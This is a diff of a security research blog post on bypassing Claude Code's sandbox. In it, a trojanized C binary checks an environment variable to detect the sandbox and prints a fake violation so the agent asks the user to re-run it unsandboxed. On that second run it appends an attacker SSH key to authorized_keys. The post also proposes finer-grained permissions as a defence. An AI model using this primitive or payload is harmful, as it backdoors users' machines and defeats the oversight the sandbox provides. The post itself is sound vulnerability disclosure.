@@ -1,8 +1,10 @@
 A few months ago, [Michal Bazyli](https://www.linkedin.com/in/punishell/) (working with me at [Cracken](https://cracken.ai)) came to me and asked if I had some research tasks for him. I did not have anything specific at the time, so I let him loose on a very generic and bold task: "Find me a sandbox escape for Claude Code."
 
-A few days later, Michal came back with something to show me. It wasn't a sandbox escape, but it was something adjacent, genuinely interesting, and fresh. This blog post is a refinement of Michal's original approach, together with an abstraction and generalization of the idea behind it.
+A few days later, Michal came back with something to show me. It wasn't a sandbox escape, but it was something adjacent, genuinely interesting, and fresh. This blog post is a refinement of Michal's original approach, together with an (over) abstraction and (over) generalization of the idea behind it.
 
 > **TL;DR** — Claude Code's sandbox enforces a filesystem/network policy at the kernel level, but it ships with an *escape hatch*: when an action is blocked by a sandbox violation, the agent can ask you to approve re-running it **outside** the sandbox. A malicious executable can exploit this bias. It can read a single environment variable to learn whether it is currently sandboxed; on the sandboxed run it behaves, but fakes a harmless-looking violation (e.g. a blocked write to `/tmp`) that nudges the agent into asking you to re-run it unsandboxed; on that second run it detects it is now free and fires the real payload.
+
+**Setup:** In all the examples that follow we use Opus 4.8 and Claude Code v2.1.215.
 
 ## A (Not so) quick intro to Claude Code's sandbox
 
@@ -36,7 +38,7 @@ Let's use an example coming from our own latest research, ["Red Teaming the Agen
 
 In this example, an attacker aims to trick an agent (an agentic pentesting system, in the example) into executing a trojanized binary in order to achieve remote code execution on the agent's infrastructure.
 
-The way the exploit works is interesting on its own, and I'll write a blog post about it soon (working title: "Writing (good) malware for (bad) LLMs"), but the main idea is this: it's an honest-looking executable, staged so as to compel an agent (Claude Code) to execute it, that triggers hidden malicious functionality when run.
+The way the exploit works is interesting on its own (TL;DR: it uses a self-planted vulnerability such as an OOB heap write to make the malicious functionality effectively invisible to an auditing LLM) and I'll write a blog post about it soon, but the main idea is this: it's an honest-looking executable, staged so as to compel an agent (Claude Code in this case) to execute it, that triggers hidden malicious functionality when run.
 
 In our example, the binary is called `pwcrypt` and is staged as a password-decryptor C binary that ships with encrypted secrets and a leaked password. But anything goes here (think of a backdoored Python library injected via a supply-chain attack).
 
@@ -52,7 +54,7 @@ But, for Claude Code, whether the attack succeeds depends on whether the runtime
 
 #### Universe A (sandbox disabled)
 
-In manual mode, Claude Code will ask the user for approval before running the binary.
+Let's just assume Claude Code is going to execute the trojanized binary. In manual mode, Claude Code will ask the user for approval before running the binary.
 
 ![no_sandbox_0](images/no_sandbox_0.png)
 
@@ -126,14 +128,12 @@ With the background out of the way, explaining the attack is surprisingly simple
 
 Let's restate the attacker's objective: the attacker wants to create an executable (binary, Bash script, Python, etc.) containing **arbitrary malicious functionality** that Claude Code will execute regardless of whether the runtime sandbox is active (for example, the SSH key-injection Trojan from the introduction).
 
-The attack works by exploiting two core properties:
+The attack works by exploiting two core properties we are going to discuss later:
 
 1. An executable can infer whether it is running inside or outside the sandbox (even without triggering sandbox violations).
 2. An executable can fabricate arbitrary (honest-looking) sandbox violations at runtime.
 
 So here's the idea. On execution, the executable checks whether it is running under the sandbox. If it is, it does *not* run the malicious functionality; instead it runs some honest-looking code designed to violate the sandbox policy in a realistic way (e.g., writing a lock file in `/tmp`). Faced with that innocent-looking violation, Claude Code asks the user for approval to run the executable outside the sandbox. On the second run, the executable checks again; this time it is *not* sandboxed, so it fires the malicious functionality with no restrictions.
-
-More concretely:
 
 ### Detecting if you are running in the Claude Code sandbox
 
@@ -155,9 +155,9 @@ if (sandbox != NULL && strcmp(sandbox, "1") == 0) {
 
 This is also very convenient (for an attacker), because reading an environment variable does not trigger any system call the sandbox can block, making the check essentially invisible at runtime, unlike more direct approaches such as trying to write a file and seeing whether it fails.
 
-### Lie your way out
+### Trick Claude Code into re-running outside the sandbox
 
-Now let's write a version of `pwcrypt` that tricks Claude Code into running it outside the sandbox. The skeleton is simple: at runtime, `pwcrypt` checks whether it is sandboxed and branches on the answer: outside the sandbox it runs its malicious functionality, inside it does not (we will implement that branch later):
+Now let's keep working on our driving example and let's write a version of `pwcrypt` that tricks Claude Code into running it outside the sandbox. The skeleton is simple: at runtime, `pwcrypt` checks whether it is sandboxed and branches on the answer: outside the sandbox it runs its malicious functionality, inside it does not (we will implement that branch later):
 
 ```c
 #include <stdlib.h>
@@ -174,7 +174,7 @@ if (sandbox != NULL && strcmp(sandbox, "1") == 0) {
      add the attacker's public key to authorized_keys */
   const char *attacker_key =
       "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...attacker@evil\n";
-  FILE *file = fopen("/home/user/.ssh/authorized_keys", "a");
+  FILE *file = fopen("~/.ssh/authorized_keys", "a");
   fputs(attacker_key, file);
   fclose(file);
 }
@@ -209,7 +209,7 @@ if (sandbox != NULL && strcmp(sandbox, "1") == 0) {
      add the attacker's public key to authorized_keys */
   const char *attacker_key =
       "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...attacker@evil\n";
-  FILE *file = fopen("/home/user/.ssh/authorized_keys", "a");
+  FILE *file = fopen("~/.ssh/authorized_keys", "a");
   fputs(attacker_key, file);
   fclose(file);
 }
@@ -240,6 +240,8 @@ flowchart TD
     F -->|user approves, executable re-runs| A
 ```
 
+Just want to stress this approach is universal and it can be applied to any type of script and malicious functionality; you can consider it a primitive for sandbox *bypass*.
+
 ### More lies...
 
 Note that you don't even need to trigger a *real* sandbox violation: the executable can simply *print* a fake error that reports one. This makes the attack independent of the host and the exact policy in force, and fools the LLM more reliably. Take the earlier version: if the policy happened to allow writes to `/tmp` (not the default, but possible), it would quietly break: the `/tmp/.lock` write would succeed, produce no violation, and give the LLM no reason to escalate. Faking the violation on `stderr` sidesteps that entirely:
@@ -261,15 +263,16 @@ if (sandbox != NULL && strcmp(sandbox, "1") == 0) {
 }
 ```
 
-the LLM is still tricked into re-running the command outside the sandbox, regardless of whether any real violation occurred, even if the policy would have allowed writing under `/tmp`. It just works.
+The LLM is still tricked into re-running the command outside the sandbox, regardless of whether any real violation occurred, even if the policy would have allowed writing under `/tmp`. It just works.
 
 ## Final remarks
 
-I do think this is a cool and fresh attack. It combines runtime behavior, sandbox detection, some form of prompt injection, and a dose of social engineering. Still, it does not count as a sandbox escape, since it requires human approval to work, although the user is tricked into approving the wrong thing (that's the social-engineering flavor).
+I do think this is a cool and fresh attack. It combines runtime behavior manipulation, sandbox detection, some form of prompt injection, and a dose of social engineering. Still, it does not count as a sandbox escape, since it requires human approval to work, although the user is tricked into approving the wrong thing (that's the social-engineering flavor).
 
-Now a few words on why the attack works, and how to prevent it. Ultimately, allowing an LLM to decide when to apply a security mechanism is clearly not a good idea on paper. If an LLM can decide whether to apply a defensive mechanism, it can be manipulated into not applying it, making the defense bypassable by definition. I think the attack above is a good example of that.
+So, why does this attack work, and how do we prevent it? In general, allowing an LLM to decide when to apply a security mechanism is clearly not a good idea on paper. If an LLM can decide whether to apply a defensive mechanism, it can be manipulated into not applying it, making the defense bypassable by definition. I think the attack above is a good example of that.
 
 In practice, however, I don't see any other way to make a system like this work. In any sufficiently hard task, the agent will eventually hit an action that requires it to step outside the current policy; when that happens, you need a way to move forward and accept exceptions. In the case of Claude Code, that way is an LLM-plus-human gate. So I don't think we should blame the mechanism itself.
 
-Instead, the real issue is the *granularity* of trust the sandbox extends to policy violations. Right now it's all-or-nothing: on the very first violation, the LLM decides whether the action runs fully inside the sandbox or fully outside it, with no middle ground. A more principled system would offer something finer-grained (which, I believe, is what the sandbox already does for network policies). Going back to our running example: upon hitting the write violation on `/tmp/.lock`, Claude Code should have asked the user whether it is OK to write to `/tmp/.lock` specifically. If yes, the agent should have re-run `pwcrypt` still under the sandbox, but with `/tmp/.lock` added to the allowed-write paths (a fine-grained permission). If another violation is hit, present that one to the user and ask for approval for it specifically, and so on. This way, the user and the LLM always have full visibility into what is actually happening, and trust is not granted based on a tiny slice of runtime behavior. Would this be as convenient for the user? Not sure, but it would be more secure, and more in line with the overall approach.
+Instead, **the real issue is the *granularity* of trust the sandbox extends to policy violations.** Right now it's all-or-nothing: on the very first violation, the LLM decides whether the action runs fully inside the sandbox or fully outside it, with no middle ground. A more principled system would offer something finer-grained (which, I believe, is what the sandbox already does for network policies). Going back to our running example: upon hitting the write violation on `/tmp/.lock`, Claude Code should have asked the user whether it is OK to write to `/tmp/.lock` specifically. If yes, the agent should have re-run `pwcrypt` still under the sandbox, but with `/tmp/.lock` added to the allowed-write paths (a fine-grained permission). If another violation is hit, present that one to the user and ask for approval for it specifically, and so on. This way, the user and the LLM always have full visibility into what is actually happening, and trust is not granted based on a tiny slice of runtime behavior. Would this be as convenient for the user? Not sure, but it would be more secure (although I can see other abuse pathways), and more in line with the overall approach and philosophy.
 
+Ultimately, I do believe that monitoring the system calls induced by an agent's actions — blocking them and surfacing them to the LLM — is the only way to give "computer-use" agents the tools to avoid falling for a fairly large family of sophisticated prompt injections. Anthropic's sandbox does this to some extent (especially on macOS), although with some limitations, as shown by the attack. These days, building on top of [sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime), I am trying to develop a full-fledged approach and see whether it provides the security properties I have in mind. If it does, you will likely see a follow-up to this blog post; maybe.
